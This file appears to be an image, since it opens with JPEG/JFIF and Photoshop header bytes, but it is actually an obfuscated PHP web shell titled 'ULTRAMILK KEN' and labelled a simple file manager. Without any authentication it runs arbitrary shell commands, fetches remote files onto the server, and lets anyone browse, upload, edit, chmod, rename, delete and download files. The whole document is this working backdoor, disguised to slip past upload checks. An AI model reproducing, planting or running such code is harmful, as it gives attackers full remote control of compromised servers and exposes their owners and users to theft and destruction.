ÿØÿà JFIF      ÿí „Photoshop 3.0 8BIM     h( bFBMD0a000a1a020000cf1200005d240000e2290000302e0000a8390000144e00008b510000ed570000035c0000da7a0000 ÿÛ „ 



<?php header("X-XSS-Protection: 1; mode=block");header("X-Frame-Options: DENY");header("X-Content-Type-Options: nosniff");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors',FALSE);session_start();function mwpmwxvm_1988393158($kpxmthvj_2918445923){return htmlspecialchars(trim($kpxmthvj_2918445923));}if(isset($_GET['logout'])){session_destroy();session_regenerate_id(true);header("Location: ?");exit;}echo '<html><head><title>ULTRAMILK KEN</title>';echo '<style>
body { font-family: Arial, sans-serif; background-color:rgb(41, 28, 2); color: #fff; margin: 0; padding: 0; }
h1 { color:rgb(138, 86, 9); text-align: center; }
input[type="text"], input[type="password"], input[type="url"], input[type="submit"], input[type="file"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
input[type="submit"] { background-color:rgb(138, 86, 9); color: white; cursor: pointer; }
table { width: 90%; margin: 20px auto; border-collapse: collapse; }
th, td { padding: 10px; text-align: left; border: 1px solid #444; color: #fff; }
th { background-color:rgb(138, 86, 9); }
a { color:rgb(138, 86, 9); text-decoration: none; }
a:hover { text-decoration: underline; }
.container { width: 80%; margin: 0 auto; }
textarea { font-size: 14px; width: 100%; height: 600px; background-color:rgb(41, 28, 2); color: #eee; border: none; padding: 10px; }
</style></head><body>';echo '<div class="container">';echo '<h1>ULTRAMILK KEN</h1>';echo '<p>This is a simple file manager tool created by ULTRAMILK KENSEO.</p>';echo '<form method="post">
<input type="text" name="cmd" placeholder="Enter command" required />
<input type="submit" value="Execute" />
</form>';if(isset($_POST['cmd'])){$rnxfmtic_2395663060=mwpmwxvm_1988393158($_POST['cmd']);echo '<pre>'.htmlspecialchars(shell_exec($rnxfmtic_2395663060)).'</pre>';}echo '<form method="post">
<input type="url" name="remote_url" placeholder="Remote File URL" required />
<input type="submit" value="Remote Upload" />
</form>';if(isset($_POST['remote_url'])){$yivrgtai_1760183548=filter_var($_POST['remote_url'],FILTER_SANITIZE_URL);if(filter_var($yivrgtai_1760183548,FILTER_VALIDATE_URL)){$tuktgzgy_3621721704=basename($yivrgtai_1760183548);if(file_put_contents($tuktgzgy_3621721704,fopen($yivrgtai_1760183548,'r'))){echo '<p><font color="green">Remote file uploaded successfully as '.$tuktgzgy_3621721704.'</font></p>';}else{echo '<p><font color="red">Remote upload failed.</font></p>';}}else{echo '<p><font color="red">Invalid URL.</font></p>';}}echo '<form method="get">
<input type="text" name="search" placeholder="Search files or folders" />
<input type="submit" value="Search" />
</form>';$narocqhl_482938420=isset($_GET['HX'])?mwpmwxvm_1988393158($_GET['HX']):getcwd();$narocqhl_482938420=str_replace('\\','/',$narocqhl_482938420);$ffmjohef_2344257041=explode('/',$narocqhl_482938420);foreach($ffmjohef_2344257041 as $fesgtfox_3208210256=>$vbejuyvl_2151571073){if($vbejuyvl_2151571073==''&&$fesgtfox_3208210256==0){echo '<a href="?HX=/">/</a>';continue;}if($vbejuyvl_2151571073=='')continue;echo '<a href="?HX=';for($auppoopj_3865851505=0;$auppoopj_3865851505<=$fesgtfox_3208210256;$auppoopj_3865851505++){echo"$ffmjohef_2344257041[$auppoopj_3865851505]";if($auppoopj_3865851505!=$fesgtfox_3208210256)echo "/";}echo '">'.$vbejuyvl_2151571073.'</a>/';}echo '<br><br><form method="post">
<input type="text" name="new_name" placeholder="Enter file/folder name" required />
<input type="submit" name="create_file" value="Create File" />
<input type="submit" name="create_dir" value="Create Directory" />
</form>';if(isset($_POST['create_file'])){$dxfuurjp_2020770509=$narocqhl_482938420.'/'.mwpmwxvm_1988393158($_POST['new_name']);if(file_put_contents($dxfuurjp_2020770509,'')!==false){echo '<p><font color="green">File created successfully.</font></p>';}else{echo '<p><font color="red">Failed to create file.</font></p>';}}if(isset($_POST['create_dir'])){$vwhjtxbd_2209019398=$narocqhl_482938420.'/'.mwpmwxvm_1988393158($_POST['new_name']);if(mkdir($vwhjtxbd_2209019398)){echo '<p><font color="green">Directory created successfully.</font></p>';}else{echo '<p><font color="red">Failed to create directory.</font></p>';}}echo '<br><form enctype="multipart/form-data" method="POST">
<input type="file" name="file" required />
<input type="submit" value="Upload" />
</form>';if(isset($_FILES['file'])){$acywigmi_1099374753=$narocqhl_482938420.'/'.basename($_FILES['file']['name']);if(move_uploaded_file($_FILES['file']['tmp_name'],$acywigmi_1099374753)){echo '<p><font color="green">File uploaded successfully.</font></p>';}else{echo '<p><font color="red">File upload failed.</font></p>';}}echo '<table>';$dwxcmbfn_4107081203=scandir($narocqhl_482938420);if(isset($_GET['search'])){$ynsshlkc_277378562=strtolower($_GET['search']);$dwxcmbfn_4107081203=array_filter($dwxcmbfn_4107081203,function($dbqyguof_2359244304)use($ynsshlkc_277378562){return bkvmrtnb_2391330666(strtolower($dbqyguof_2359244304),$ynsshlkc_277378562)!==false;});}foreach($dwxcmbfn_4107081203 as $cozsodrw_521872670){if($cozsodrw_521872670=='.'||$cozsodrw_521872670=='..')continue;$xtwuundx_190089999="$narocqhl_482938420/$cozsodrw_521872670";$ovopawmh_1445791921=is_dir($xtwuundx_190089999)?'Directory':'File';$qblnyegt_4156564586=is_file($xtwuundx_190089999)?filesize($xtwuundx_190089999):'-';echo"<tr>
    <td>$ovopawmh_1445791921</td>
    <td><a href=\"?HX=$xtwuundx_190089999\">$cozsodrw_521872670</a></td>
    <td>$qblnyegt_4156564586</td>
    <td><a href=\"?option=edit&HX=$xtwuundx_190089999\">Edit</a> |
    <a href=\"?option=chmod&HX=$xtwuundx_190089999\">Chmod</a> |
    <a href=\"?option=rename&HX=$xtwuundx_190089999\">Rename</a> |
    <a href=\"?option=delete&HX=$xtwuundx_190089999\" onclick=\"return confirm('Are you sure?')\">Delete</a> |
    <a href=\"?download=$xtwuundx_190089999\">Download</a>
    </td>
    </tr>";}echo '</table>';if(isset($_GET['download'])){$dbqyguof_2359244304=$_GET['download'];if(file_exists($dbqyguof_2359244304)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename='.basename($dbqyguof_2359244304));header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($dbqyguof_2359244304));flush();readfile($dbqyguof_2359244304);exit;}else{echo '<p><font color="red">File not found.</font></p>';}}if(isset($_GET['option'])){$ptrcwdtv_1518731440=$_GET['option'];$dbqyguof_2359244304=$_GET['HX'];if($ptrcwdtv_1518731440=='edit'){if(isset($_POST['new_content'])){file_put_contents($dbqyguof_2359244304,$_POST['new_content']);echo '<p><font color="green">File edited successfully.</font></p>';}echo '<form method="post">
        <textarea name="new_content">'.htmlspecialchars(file_get_contents($dbqyguof_2359244304)).'</textarea>
        <input type="submit" value="Save Changes" />
        </form>';}elseif($ptrcwdtv_1518731440=='chmod'){if(isset($_POST['new_perms'])){chmod($dbqyguof_2359244304,octdec($_POST['new_perms']));echo '<p><font color="green">Permissions changed successfully.</font></p>';}echo '<form method="post">
        <input type="text" name="new_perms" placeholder="Enter new permissions (e.g., 0755)" required />
        <input type="submit" value="Change Permissions" />
        </form>';}elseif($ptrcwdtv_1518731440=='rename'){if(isset($_POST['new_name'])){$hxjtkpsr_2865679067=dirname($dbqyguof_2359244304).'/'.mwpmwxvm_1988393158($_POST['new_name']);rename($dbqyguof_2359244304,$hxjtkpsr_2865679067);header("Location: ?HX=".dirname($hxjtkpsr_2865679067));exit;}echo '<form method="post">
        <input type="text" name="new_name" placeholder="Enter new name" required />
        <input type="submit" value="Rename" />
        </form>';}elseif($ptrcwdtv_1518731440=='delete'){if(is_dir($dbqyguof_2359244304)){rmdir($dbqyguof_2359244304);}else{unlink($dbqyguof_2359244304);}header("Location: ?HX=".dirname($dbqyguof_2359244304));exit;}}echo '</div>';echo '</body></html>';?>
